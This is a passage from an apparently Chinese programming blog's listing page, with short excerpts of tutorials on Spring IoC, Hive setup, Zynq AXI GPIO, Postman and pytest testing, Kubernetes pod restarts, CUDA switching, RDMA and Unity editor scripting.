IoC容器与DI 我们需要理解一下Spring是包含众多工具方法的IoC容器这句话，什么是IoC呢？IoC = Inversion of Control 翻译成中文就是控制反转，我们通过一个例子来解释一下这个名词。
构建⼀辆⻋（Car Class），然⽽⻋需要依赖⻋身(FrameWork Class)，⽽⻋身需要依赖底盘（BottomClass），⽽底盘需要依赖轮胎（Tire Class），此时我们传统开发的方法来完成这个需求：
class Car { private Framework framework; public Car(int size) { this.framework = new Framework(size); } public void init() { System.out.println("构造Car"); framework.init(); } } class Framework { private Bottom bottom; public Framework(int size ) { this.bottom = new Bottom(size); } public void init() { System.out.println("构造Framework"); bottom.init(); } } class Bottom { private Tire tire; public Bottom(int size) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f4b17fe7cc23de3abd9b271025e8fe3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65ef24cc017b70afc74e3a7a2dc1b98c/" rel="bookmark">
			【Hive 01】简介、安装部署、高级函数使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 Hive简介 1.1 Hive系统架构 Hive是建立在 Hadoop上的数据仓库基础构架，它提供了一系列的工具，可以进行数据提取、转化、加载（ ETL ）Hive定义了简单的类SQL查询语言，称为HQL，它允许熟悉SQL的用户直接查询Hadoop中的数据Hive包含SQL解析引擎，它会将SQL语句转译成MR Job，然后在Hadoop中执行Hive的数据存储基于Hadoop的HDFSHive没有专门的数据存储格式，默认可以直接加载文本文件TextFile，还支持SequenceFile、RCFile等 1.2 Metastore Metastore是Hive元数据的集中存放地元数据包括表的名字，表的列和分区及其属性，表的数据所在目录等Metastore默认使用内嵌的Derby数据库作为存储引擎，推荐使用Mysql数据库作为外置存储引擎 1.3 Hive与MySQL对比 HiveMySQL数据存储位置HDFS本地磁盘数据格式用户决定系统决定数据更新不支持支持索引有，但较弱有执行MapReduceExecutor执行延迟高低可扩展性高低数据规模大小 2 Hive安装部署 访问Hive官方网站，下载apache-hive-3.1.2-bin.tar.gz安装包，在/data/soft目录下解压文件。
2.1 配置hive-env.sh cd apache-hive-3.1.2-bin/conf/ mv hive-env.sh.template hive-env.sh 在文件末尾添加以下内容：
export JAVA_HOME=/home/gdan/data/jdk-8u131-linux-x64/jdk1.8.0_131 export HIVE_HOME=/home/gdan/data/soft/apache-hive-3.1.2-bin export HADOOP_HOME=/home/gdan/data/soft/hadoop-3.2.0 再/etc/profile也需要设置hive的环境变量
export HIVE_HOME=/home/gdan/data/soft/apache-hive-3.1.2-bin export PATH=$HIVE_HOME/bin:$PATH 2.2 安装mysql数据库，并创建hive库 1.安装MySQL 在终端中输入以下命令来安装MySQL：
sudo apt-get update sudo apt-get install mysql-server 安装过程中会提示您设置MySQL的root用户密码，请根据提示进行设置。
安装时没有提示输入root账户密码，默认是空，可以执行以下命令设置密码为xxxx：
sudo mysql -u root -p #密码按Enter即可进入mysql shell，空格也可以，普通用户一定sudo 2. 创建hive元数据数据库
create database hive; 2.3 配置hive-site.xml cd apache-hive-3.1.2-bin/conf/ mv hive-default.xml.template hive-site.xml 在文件中添加以下内容：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65ef24cc017b70afc74e3a7a2dc1b98c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38880fd3ff31d0039d0ae89311227bd0/" rel="bookmark">
			XILINX ZYNQ 7000 AXI总线 (三) AXI GPIO
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一步一步来搭建一下AXI GPIO
创建ZYNQ 后先来看下各个接口的含义
1.M_AXI_GP0_ACKL和M_AXI_GP0
ZYNQ的PS部分是有一个GP接口，32 Bit 的AXI master接口，默认是打开的，如果双击绿框可以看到是打开的
M_AXI_GP0 就是AXI的主机接口，M_AXI_GP0_ACKL是主机接口的时钟。
2.FCLK_CLK0
这个信号在上图中可以看到，PS-PL有4路时钟，点击绿框跳转到PS-PL时钟设置界面。
FCLK_CLK0 就是PS-PL时钟信号。
3.FCLK_RESET0_N
PS-PL 处理时钟还有4路复位信号
4.FIXED IO
固定的IO，这里说的是ZYNQ PS最小系统就有的IO。比如说MIO，DDR，PS复位，PS时钟等。这些是固定都有的
只要有PS系统这几个就跑不了。
到这里基本的信号了解完毕。
二.AXI GPIO
先上一个AXI GPIO IP
从接口，时钟，复位 和GPIO。GPIO说的是引脚
可以设置引脚的个数和方向，输入输出和高组态。
2.1 连接
如果尝试的吧AXI GPIO 从接口和ZYNQ的主接口连接的时候，ViVado会提示无法连接。
AXI 接口的互联是需要一个叫做Interconnect的结构，也是一个IP核。很好，我们就创建出来，然后按照主从配对连接。
接下来就是把复位连接在一起，就接到PS-PL的复位信号上，时钟都接到PS-PL时钟上来。
整个系统就连接完成了，这个时候我们去校验链接会提示加入system reset的IP.
这里我们不考虑同步复位的问题。直接忽略问题。
然后进行地址分配，AXI是地址到地址的通讯。
注意0x4120_0000这个地址。
然后进行常规操作
然后进行综合，IO引脚分配。完事后导入到SDK。
导入官方的例程。
找到初始化GPIO的地方，看到这个地址很熟悉。
OK，到这里就完成了。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fca0ce8fe94af20383f04f87bccb7cf/" rel="bookmark">
			史上最全，Postman接口自动化测试-项目案例（总结）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录：导读 前言一、Python编程入门到精通二、接口自动化项目实战三、Web自动化项目实战四、App自动化项目实战五、一线大厂简历六、测试开发DevOps体系七、常用自动化测试工具八、JMeter性能测试九、总结（尾部小惊喜） 前言 背景
在实际业务中，经常会出现让用户输入用户密码进行验证的场景。而为了安全，一般都会先请求后台服务器获取一个随机数做为盐值，然后将盐值和用户输入的密码通过前端的加密算法生成加密后串传给后台服务器。
后台服务器接到到请求后，先获取校验原来的随机数是否有效合法，如合法后，再做解密，并根据约定的规则把随机数盐值剔除等后续处理。
也就是说先有一个获取随机数的接口请求，然后有一个验证密码的请求。
Postman来自动化这种场景的测试
获取随机数的接口每次请求返回的随机数是不一样的，那么这种情况下，要实现接口的自动化，就要用到postman中设置环境变量这个功能。
1、脚本编写
在这里，为了防止别人用工具对接口发起请求，除做了token校验外，还简单对请求时间做了校验，即服务器会校验客户端的请求时间前后不能相差1分钟，如超过，说明是有问题的请求，将直接拒绝。
脚本要能自动运行，就必须在Postman上实现一个获取当前时间的功能，每次请求前获得当前时间。在Postman中是在Pre-request Script中编写，获得后台约定的日期格式，然后通过
postman.setEnvironmentVariable将其设置到环境变量中，如下所示：
var currentTime = new Date(); function PrefixInteger(num, length) { return (Array(length).join('0') + num).slice(-length); } Date.prototype.toMyDateStr = function() { return this.getFullYear() + "-" + PrefixInteger((this.getMonth() + 1),2) + "-" + PrefixInteger(this.getDate(),2) + " " + PrefixInteger(this.getHours(),2) + ":" + PrefixInteger(this.getMinutes(),2) + ":" + PrefixInteger(this.getSeconds(),2); }; postman.setEnvironmentVariable("reqTime", currentTime.toMyDateStr()); 这样就可以在请求体中通过{{}}方式进行引用。
注意的是，我这时的请求是application/json格式，且是UTF-8编码格式的，所以在Headers中还有如下配置。
接下来就是最重要的一块了，就是对请求响应的判断（判断是否成功）及成功后根据返回的随机数用加密算法对密码进行加密处理。
接下来在验证密码的接口中，就可以通过{{radomNumCode}}、{{pwdSM2}}方式进行变量的引用。
在这个验密请求中，Pre-request Script和Headers中的配置和上面的获取随机因子的配置是一样的，下面我们再来看一看Tests中的内容。
Tests中其实也是对http请求的返回码和响应体的返回码、返回消息进行判断。
2、运行效果
先运行获取随机因子的请求，在Test Results中看到都是和预期值一致的，也就是全是PASS的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5fca0ce8fe94af20383f04f87bccb7cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff40a7d80dbe29c4c006ed4835aac988/" rel="bookmark">
			Python自动化测试框架pytest的详解安装与运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章主要为大家介绍了Python自动化测试框架pytest的简介以及安装与运行，有需要的朋友可以借鉴参考下希望能够有所帮助，祝大家多多进步
1. pytest的介绍 pytest是一个非常成熟的全功能的python测试工具，它主要有以下特征：
简单灵活，容易上手；
支持简单的单元测试和复杂的功能测试
显示详细的断言失败信息
能自动识别测试模块和测试功能
有测试会话、测试模块、测试类、测试函数级别的fixture
可用于selenium/Appium等自动化测试和接口自动化测试(pytest+requests);
拥有丰富的第三方插件，还可自定义扩展；
可与持续集成工具进行很好的集成，如：Jenkins。
…
2. pytest的安装 1. 使用以下命令进行安装 1
pip install -U pytest
参数说明：
-U： 将指定的软件包升级至当前最新的可用版本
其他说明：
官网安装说明有加上-U参数，不加上-U参数亦可
2. 检查是否成功安装正确版本 1
2
$ pytest --version
pytest 6.2.4
3. pytest识别测试的条件 1.若无指定参数，pytest会从testpath(如果配置)或当前目录下递归查找与 norecursedirs不匹配的目录。
2.查找目录中所有符合test_*.py和*_test.py的文件
3.从匹配到的测试文件中，搜集满足以下条件的测试用例：
在类之外的所有test_*方法Test*类中包含的所有test_*方法（Test*类中不能含有__init__()方法） 4. pytest的运行 pytest的运行分为以下方式：
1. Pycharm中进行调用
2. Python代码中调用
3. 使用命令行进行调用
4.1 Pycharm中调用 Pycharm中默认的test runner是Unittest，无法识别使用pytest编写的测试文件和测试用例
进入Preferences--&gt;Tools--&gt;Python Integrted Tools，
修改Testing下的Default test runner，改成pytest后，
则可以直接使用Pycharm中的Run按钮无参数的调用pytest。
4.2 Python代码中调用 在代码中添加入口函数—pytest.main()，即可在Python代码中调用pytest。
pytest.main()的参数：
1. args:命令行指令列表集
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff40a7d80dbe29c4c006ed4835aac988/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41bc9db3532c52a9ca5d708498f5b6f8/" rel="bookmark">
			LIN通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LIN通信介绍 LIN 是 Local Interconnect Network 的缩写，是基于 UART/SCI(Universal Asynchronous Receiver-Transmitter / Serial Communication Interface，通用异步收发器/串行通信接口)的低成本串行通信协议。可用于汽车、家电、办公设备等多种领域。
LIN通信特点 串行通信 线间干扰小，节省线束，传输距离长 单线传输 单线 , 总线电压 12V 最高速率 20Kbit/s 满足车身上大部分的应用需求 单主多从结构 不存在冲突，无需仲裁 基于通用 UART/SCI 的低成本接口硬件 几乎所有 MCU 有具备 LIN 总线的硬件基础 从节点无须晶振或陶瓷震荡器就可以实现同步 利用报头里的同步场实现同步，大幅度降低成本 可计算的信号传输的延迟时间 网络通信可预期性 可灵活的增加或减少从节点 无需改变其他节点的硬件电路 一条总线最多可连接 16 个节点 由总线电气特性决定，主节点有且只有1个，从节点有1到15个 支持多包报文传输 基于 ISO15765-2 的传输层规范 支持诊断功能 支持 ISO14229 的诊断服务 LIN网路拓扑结构 一个LIN网络由一个主任务，若干个从任务组成
主节点既有主任务又有从任务， 从节点只包含从任务，因此主节点从节点和主任务从任务不是一个对等的关系 主任务负责决定总线上的报文，从任务提供每一帧的数据 LIN的帧结构 帧(Frame)包含帧头(Header)和应答(Response)两部分。主机任务负责发送帧头；从机任务接收帧头并对帧头所包含信息进行解析，然后决定是发送应答，还是接收应答，还是不作任何反应。帧在总线上的传输如图 3.1所示。
通信原理： 主任务发送报头，从任务用响应来补充报头形成完整的报文。 系统灵活性： 可以自由地增减从节点，而不需要改变其它从节点的软件和硬件 报文传输： 报文的内容由 ID 来定义 ( 跟 CAN 相似） 广播： 所有节点都能够同时地接受和响应总线上的帧 帧结构：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41bc9db3532c52a9ca5d708498f5b6f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afdeafe28ac7c527545a51912ce6f330/" rel="bookmark">
			UI自动化测试是什么？什么项目适合做UI自动化测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本文主要分享做简单的UI自动化测试简介、为何要做UI自动化测试、什么情况下适合做UI自动化测试以及其他的心得体会，希望能给各位同行带来思想上的碰撞。
1、about自动化测试 定义：把人为驱动的测试转化为机器执行的一种过程，重点在于持续集成这个概念；
优势：节约人力和时间成本；
测试金字塔：
如上图所示，敏捷大师Mike Cohn提出该概念，然后由Martin Fowler大师在此基础上提出了测试分层概念，以区别于传统的自动化测试。
2、自动化测试分层 单元自动化测试（数据处理层）：指对软件中最小的可测试单元进行检查和验证，一般需要借助单元测试框架，如java的Junit、TestNG，python的unittest，常见的手段是code review等；
接口自动化测试（业务逻辑层）：主要检查验证模块间的调用返回以及不同系统、服务间的数据交换，常见的接口测试工具有postman、jmeter、loadrunner等；
UI自动化测试（GUI界面层）：UI层是用户使用产品的入口，所有功能通过这一层提供给用户，测试工作大多集中在这一层，常见的测试工具有UFT、Robot Framework、Selenium、Appium等；
性价比：按照测试金字塔模型以及投入/产出比，越向下，回报率越高；
Google的自动化分层投入占比：
小测试（Unit）：占比70%；
中测试（Service）：占比20%；
大测试（UI）：占比10%；
自动化测试面临的挑战：面临的最大挑战就是变化，因为变化会导致测试用例运行失败，所以需要对自动化脚本不断debug，如何控制成本、降低成本是对自动化测试工具以及人员能力的挑战。
3、什么样的项目适合自动化测试 如上图所示，真正工作中无法全部满足以上条件，所以需要作出权衡，一般来说，只需要满足以下几点，就可以对项目开展自动化测试（图中红色框标注的选项）：
①需求稳定，不会频繁变更
自动化测试最大的挑战就是需求的变化，而自动化脚本本身就需要修改、扩展、debug，去适应新的功能，如果投入产出比太低，那么自动化测试也失去了其价值和意义；
折中的做法是选择相对稳定的模块和功能进行自动化测试，变动较大、需求变更较频繁的部分用手工测试；
②多平台运行，组合遍历型、大量的重复任务
测试数据、测试用例、自动化脚本的重用性和移植性较强，降低成本，提高效率和价值；
③软件维护周期长，有生命力
自动化测试的需求稳定性要求、自动化框架的设计、脚本开发与调试均需要时间，这其实也是一个软件开发过程，如果项目周期较短，没有足够的时间去支持这一过程，那自动化测试也就不需要了；
④被测系统开发较为规范，可测试性强
主要出于这几点考虑：被测试系统的架构差异、测试技术和工具的适应性、测试人员的能力能否设计开发出适应差异的自动化测试框架；
4、常见的自动化测试工具简介 UFT（Unified Functional Testing）
即原来的QTP（Quick Test Professional Software）与ST（Service Test）合并而来，由HP公司开发，是一个企业级的商业自动化测试工具，提供了强大易用的录制回放功能，
同时兼容对象识别模式与图像识别模式，支持B/S和C/S两种架构的软件测试；
Robot Framework
一款基于python语言编写的自动化测试框架工具，具备良好的扩展性，支持关键字驱动，支持多种类型的客户端和接口，可进行分布式测试；
Selenium
应用于web的自动化测试工具，支持多平台、多浏览器、多语言来实现自动化，优点如下：
①开源、免费；
②多浏览器支持：chrome、Firefox、IE、Edge等；
③多平台支持：Linux、Windows、MAC；
④多语言支持：java、python、Ruby、C#、JavaScript、C++；
⑤对web界面有良好的支持；
⑥简单（API简单）、灵活（开发语言驱动）；
⑦支持分布式测试用例执行；
5、UI自动化测试要不要做？ 如果一个组织真正重视软件质量，UI自动化测试是有必要做。有如下几点理由：
1.任何自动化工具都是在简单、机械、重复的任务场景下最能发挥作用，UI测试非常符合这个特点。
2.对于很多组织来说，UI测试是当前耗费测试团队人力多的环节，大部分专职测试人员日常工作就是UI测试。“工欲善其事必先利其器”，测试人员也需要自动化工具来提升其日常工作效率。
3.无论后台多复杂、多重要，用户接触的终究还是前端界面。现在的软件除了后台逻辑之外，还有很多前端脚本逻辑和样式，单纯靠后台接口/单元测试，无法证明用户端的可用性。
4.自动化测试确实是要分层的（单元测试、接口测试、UI测试），从测试团队的角度来说，非常希望有足够充分的单元测试和接口测试来保证提测版本的质量，但实际情况往往是开发团队所维护单元测试和接口测试也是非常不充分、甚至几乎没有。
所以任何项目中有人拿“分层自动化测试”跟我讲不要做UI自动化测试的时候，我都会先请他们把接口测试和单元测试展示给我看看，然后再跟他们探讨自动化测试的实施策略。但是从实践的角度，为什么很多质疑的声音呢？
归根结底就是三个字“不稳定”！测试环境构建不稳定、被测软件界面不稳定、测试框架运行不稳定。
其实只要适当的过程改善和开发团队配合，这些问题基本都是能够解决或者明显改善的。以测试环境为例，在纯手工测试阶段，有些项目的测试环境可以被随时停止、随意更新。这样对手工测试也是有影响的（工作进度受干扰、测试计划被打乱），但是可以忍受。自动化测试会对测试环境提出更规范的要求，至少不能随时停止，这就需要对研发测试过程进行必要的改善。然而被测软件界面不稳定、测试框架运行不稳定，就没有测试环境不稳定那么容易解决了。这里面主要涉及与开发团队的配合、测试框架的设计。
6、什么样的项目更适合做自动化测试 在有些人看来，质量不高的原因是没有采用先进的测试技术，比如自动化测试。但质量不高的真正原因是项目本身的质量要求就是不高的。否则哪怕堆人肉，也要实现充分的回归测试。如果在这种情况下，如果采用适合的测试框架和实施策略推行自动化测试，通常会取得比较明显的成效。
所以关于什么类型的项目适合做自动化测试，我想回答的并不是什么项目周期长、需要长期维护、采用敏捷开发模式、组织推行DevOps、测试团队有基本编码技能，balabala…这些年笔者建议不要做UI自动化测试的项目也有很多，一些被我拒绝支持的项目也符合上述特点。后来我在评估一个项目是否适合做自动化测试时，引入了一些非技术指标：
1.当前测试覆盖度、质量风险及测试投入；
2.目标测试覆盖度、质量风险，以及如果不引入自动化手段需要的测试投入；
3.这个目标是谁制定的或者是向谁承诺要达成的？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afdeafe28ac7c527545a51912ce6f330/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07d2c58c91f58fb1f9c1697ecbd9147b/" rel="bookmark">
			IDEA&#43;SpringBoot &#43; Mybatis &#43; Shiro&#43;Bootstrap&#43;Mysql资产设备管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IDEA+SpringBoot + Mybatis + Shiro+Bootstrap+Mysql资产设备管理系统 一、系统介绍1.环境配置 二、系统展示1. 管理员登录2.用户新增3.用户设置4.岗位管理5. 审批节点6. 人员查询7. 组织设置8. 人员调整9.角色设置10.角色模块映射11.模块设置12.应用模块13.光纤交换机14.服务器15.网络设备16.存储设备17.安全设备18.机房设备19.网点设备20.资产登记21.资产查询(类别)22.资产台账23.资产入库24.资产查询(组织)25.资产查询(类别)26.资产查询(位置)27.资产查询(人员)28.数据统计 三、部分代码SysUserInfoMapper.javaSysUserInfoController.javaUser.java 四、其他获取源码 一、系统介绍 本系统实现了资产设备管理系统，管理端实现了管理员登录、用户新增、用户设置、岗位管理、审批节点、人员查询、组织设置、人员调整、角色设置、角色模块映射、模块设置、应用模块、光纤交换机、服务器、网络设备、存储设备、安全设备、机房设备、网点设备、资产登记、资产查询(类别)、资产台账、资产入库、资产查询(组织)、资产查询(类别)、资产查询(位置)、资产查询(人员)、数据统计
1.环境配置 JDK版本：1.8
Mysql:8.0
二、系统展示 1. 管理员登录 登录用户名密码：admin oracle
2.用户新增 3.用户设置 4.岗位管理 5. 审批节点 6. 人员查询 7. 组织设置 8. 人员调整 9.角色设置 10.角色模块映射 11.模块设置 12.应用模块 13.光纤交换机 14.服务器 15.网络设备 16.存储设备 17.安全设备 18.机房设备 19.网点设备 20.资产登记 21.资产查询(类别) 22.资产台账 23.资产入库 24.资产查询(组织) 25.资产查询(类别) 26.资产查询(位置) 27.资产查询(人员) 28.数据统计 三、部分代码 SysUserInfoMapper.java package com.module.base.mapper; import com.baomidou.mybatisplus.core.mapper.BaseMapper; import com.module.base.entity.SysMenus; import com.module.base.entity.SysUserInfo; import java.util.HashMap; import java.util.List; /** * &lt;p&gt; * Mapper 接口 * &lt;/p&gt; */ public interface SysUserInfoMapper extends BaseMapper&lt;SysUserInfo&gt; { //查询某个用户的菜单 List&lt;SysMenus&gt; listMyMenus(String user_id); List&lt;HashMap&lt;String, Object&gt;&gt; listUserRoles(String user_id); } SysUserInfoController.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07d2c58c91f58fb1f9c1697ecbd9147b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e55fc7fbee433bc5d2c559ad2a73324b/" rel="bookmark">
			JavaScript详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、JavaScript是什么？
1.1、JavaScript 和 HTML 和 CSS 之间的关系 1.2、JavaScript 运行过程 1.3、JavaScript 的组成 二、JavaScript 的书写形式 1. 行内式 2. 内嵌式 3、外部式 注释 三、输入输出 输入: prompt 输出: alert
输出: console.log
重要概念: 四、JavaScript语法概览 4.1、变量的使用 基本用法 五、理解 动态类型 六、基本数据类型 1、number 数字类型
2、string 字符串类型 3、boolean 布尔类型 4、undefined 未定义数据类型 5、null 空值类型 七、数组 创建数组
获取数组元素 新增数组元素 1. 通过修改 length 新增 2. 通过下标新增
3. 使用 push 进行追加元素 4、删除数组中的元素 八、函数 语法格式 函数表达式 作用域 九、对象 1. 使用 字面量 创建对象
2. 使用 new Object 创建对象 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e55fc7fbee433bc5d2c559ad2a73324b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/658098652b54a563797d62fb9d173857/" rel="bookmark">
			JQ开发之表格单元格合并函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说明：在使用JQ开发table表格时会遇到单元格合并问题，下边两个函数分别为指定列合并和指定行合并。
1.合并指定列 //函数说明：合并指定表格（表格id为_w_table_id）指定列（列数为_w_table_colnum）的相同文本的相邻单元格 //参数说明：_w_table_id 为需要进行合并单元格的表格的id。如在HTMl中指定表格 id="data" ，此参数应为 #data //参数说明：_w_table_colnum 为需要合并单元格的所在列。为数字，从最左边第一列为1开始算起。 //参数说明：arrNum 是由于代码是合并相同的列，但是有时候并不想让合并，所以增加了arrNum以起到分割的效果 function _w_table_rowspan(_w_table_id,_w_table_colnum,arrNum){ _w_table_firsttd = ""; _w_table_currenttd = ""; _w_table_SpanNum = 0; _w_table_Obj = $(_w_table_id + " tr td:nth-child(" + _w_table_colnum + ")"); _w_table_Obj.each(function(i){ if(i==0){ _w_table_firsttd = $(this); _w_table_SpanNum = 1; }else{ _w_table_currenttd = $(this); if(_w_table_firsttd.text()==_w_table_currenttd.text()){ if(arrNum.length&gt;0){ for(let numb = 0;numb&lt;arrNum.length;numb++){ if(i == arrNum[numb]){ _w_table_firsttd = $(this); _w_table_SpanNum = 1; }else{ _w_table_SpanNum++; _w_table_currenttd.hide(); //remove(); _w_table_firsttd.attr("rowSpan",_w_table_SpanNum); } } }else{ _w_table_SpanNum++; _w_table_currenttd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/658098652b54a563797d62fb9d173857/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dcee78eae80fb901bbcc5b201764b84/" rel="bookmark">
			重启Kubernetes Pod的几种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法1 kubectl scale deployment XXXX --replicas=0 -n {namespace}
kubectl scale deployment XXXX --replicas=1 -n {namespace}
方法2 kubectl delete pod {podname} -n {namespace}
方法3 kubectl get pod {podname} -n {namespace} -o yaml | kubectl replace --force -f -
方法4 Kubernetes 1.15开始才有
kubectl rollout restart deploy {your_deployment_name}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a6691d7fbc4903f36bee78135fb018e/" rel="bookmark">
			java 哪些时候会类加载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、创建对象实例时 2、创建子类对象实例时，父类会被加载；先执行父类，再执行子类 3、使用类的静态成员时 public class Class { public static void main(String[] args){ //以下3种情况 类会被加载 //1、创建对象实例时； new AA(); //2、创建子类对象实例时，父类会被加载；先执行父类，再执行子类 new BB(); //3、使用类的静态成员时 System.out.println(CC.n); } } class AA{ static{ System.out.println("AA静态代码块执行"); } } class BB extends AA{ static { System.out.println("BB代码块被执行"); } } class CC extends AA{ public static int n = 90; static { System.out.println("CC代码块被执行"); } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cb9e86fd1b6efc3dda9af5438680485/" rel="bookmark">
			Ubuntu中使用update-alternatives实现多版本CUDA切换，卸载cuda 、cudnn
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 用法 update-alternatives: --install 需要 &lt;链接&gt; &lt;名称&gt; &lt;路径&gt; &lt;优先级&gt; sudo update-alternatives --install /usr/local/cuda cuda /usr/local/cuda-12.2/ 122 vim ~/.bashrc 进入配置文件； 添加以下两行：
export PATH=/usr/local/cuda/bin:$PATH export LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH 配制： sudo update-alternatives --config cuda nvcc --version cuda 卸载 bin目录下。
sudo ./cuda-uninstaller 卸载cudnn 查询：
sudo dpkg -l | grep cudnn 将其全部卸载：示例
sudo dpkg -r libcudnn8-samples sudo dpkg -r libcudnn8-dev sudo dpkg -r libcudnn8 检查：
输入下面指令后，没有任何输出即卸载成功。
sudo dpkg -l | grep cudnn 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a72205d112069f96eeb1d5a942ec5e44/" rel="bookmark">
			使用Soft-RoCE实践RDMA
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RDMA介绍 RDMA（ Remote Direct Memory Access ）意为远程直接地址访问，通过RDMA，本端节点可以“直接”访问远端节点的内存。所谓直接，指的是可以像访问本地内存一样，绕过传统以太网复杂的TCP/IP网络协议栈读写远端内存，而这个过程对端是不感知的，而且这个读写过程的大部分工作是由硬件而不是软件完成的。
RDMA本身指的是一种技术，具体协议层面，包含Infiniband（IB），RDMA over Converged Ethernet（RoCE）和internet Wide Area RDMA Protocol（iWARP）。三种协议都符合RDMA标准，使用相同的上层接口，在不同层次上有一些差别。RoCE成本比IB低，效果比iWARP好。
RDMA技术实际应用的话是得依赖网卡来完成大部分工作的，需要硬件层面支持RDMA协议的智能网卡，好在我们有Soft-RoCE，它通过软件代替硬件来将IB传输层的报文加在普通UDP报文中，从而得以让普通网卡也可以发送RoCE报文，这对于为我们学习IB传输层协议，以及编写调试基于Verbs的RDMA程序提供了一种非常低成本的方案。接下来就介绍如何安装Soft-RoCE。
Soft-RoCE与网卡硬件支持的RoCE对比如下：
下面我们就开始演示在Linux上实践RoCE。
安装Soft-RoCE apt-get安装必要组件
$ sudo apt-get install libibverbs1 ibverbs-utils 软件包名主要功能libibverbs1ib verbs动态链接库ibverbs-utilsibverbs示例程序librdmacm1rdmacm动态链接库libibumad3ibumad动态链接库ibverbs-providersibverbs各厂商用户态驱动（包括RXE）rdma-core文档及用户态配置文件 加载驱动
$ sudo modprobe rdma_rxe 创建支持RDMA协议的逻辑网卡
$ sudo rdma link add rxe0 type rxe netdev enp0s3 查看创建的RXE逻辑接口
$ ibv_devices device node GUID ------ ---------------- rxe0 0a0027fffe5ac323 $ ibv_devinfo -d rxe0 hca_id: rxe0 transport: InfiniBand (0) fw_ver: 0.0.0 node_guid: 0a00:27ff:fe5a:c323 sys_image_guid: 0a00:27ff:fe5a:c323 vendor_id: 0xffffff vendor_part_id: 0 hw_ver: 0x0 phys_port_cnt: 1 port: 1 state: PORT_ACTIVE (4) max_mtu: 4096 (5) active_mtu: 1024 (3) sm_lid: 0 port_lid: 0 port_lmc: 0x00 link_layer: Ethernet $ sudo rdma link show link rxe0/1 state ACTIVE physical_state LINK_UP netdev enp0s3 $ sudo ibstat CA 'rxe0' CA type: Number of ports: 1 Firmware version: Hardware version: Node GUID: 0x0a0027fffe5ac323 System image GUID: 0x0a0027fffe5ac323 Port 1: State: Active Physical state: LinkUp Rate: 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a72205d112069f96eeb1d5a942ec5e44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f9f6faa6f875678f7df6b4feeba009a/" rel="bookmark">
			井盖异动报警器-智能窨井盖管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6268b21e7c5c6e486dbac73b4d8f5c13/" rel="bookmark">
			每日知识之Unity显示指定内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		类型越加越多，各种无用数据被暴露出来，需要做个隐藏,在此记录一下 1.在Editor下新建一个类 并继承Editor
2.在类上面添加声明（Unity中的CustomEditor(自定义编辑器)可以对继承了MonoBehavior脚本的类(当然还有其它类)提供了属性面板的展示和修改）
[CustomEditor(typeof(Text))]
public class TextEditor: Editor
3.序列化对象和获取对象
private SerializedObject test;
void OnEnable()
{
// 获取当前的序列化对象（target：当前检视面板中显示的对象）
test = new SerializedObject(target);
